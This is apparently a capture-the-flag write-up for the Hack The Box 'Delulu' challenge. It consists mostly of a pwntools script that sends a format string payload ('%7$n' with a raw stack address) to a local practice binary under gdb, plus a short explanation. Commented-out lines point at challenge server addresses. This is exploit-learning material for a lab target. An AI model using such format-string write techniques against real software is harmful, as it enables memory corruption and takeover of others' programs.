# HTB Cyber-Apocalypse 2024 - Delulu


Delulu is a very easy difficulty challenge that features format string vulnerability, overwriting a variable's value.

<!--more-->

```python
from pwn import *
#nc 83.136.251.235 53824
# Start the process
p = process('./delulu')
#nc 94.237.49.116 55529

#p = remote('94.237.51.233',44897)
gdb.attach(p, gdbscript="b *main+134\n continue")

print(p.recv().decode())
pay = b'\xf8\xdd\xff\xff\xff\x7f'
#pay += b'\xf8\xdd\xff\xff\xff\x7f'
pay += b'%7$n'
#pay += b'%48867x%7$hn%48879x%8$hn'
# Send the payload without a newline
p.send(pay)


print(p.recvall())
```

## Explanation

Starts a local process of delulu binary for exploitation -> attaches gdb for debugging and sets a breakpoint -> creates a format string payload to write data to a specified address -> sends the payload to the process and prints the output.

